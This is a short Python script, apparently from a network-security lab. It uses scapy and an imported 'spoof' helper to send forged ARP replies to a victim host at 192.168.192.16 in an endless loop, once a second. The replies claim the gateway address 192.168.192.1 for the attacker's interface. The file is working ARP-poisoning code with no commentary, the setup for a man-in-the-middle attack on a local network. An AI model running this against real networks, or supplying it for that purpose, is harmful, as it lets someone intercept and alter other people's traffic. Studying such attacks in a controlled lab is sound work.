import sys, getopt

from arp import spoof, get_mac
from scapy.all import *

if __name__ == "__main__":
    iface = "enp0s3"
    # iface = "enp7s0"
    mac_attacker = get_if_hwaddr(iface)
    ip_victim = "192.168.192.16"
    mac_victim = get_mac(ip_victim, iface)
    print(mac_victim)
    ip_to_spoof = "192.168.192.1"

    while True:
        spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface)
        time.sleep(1)

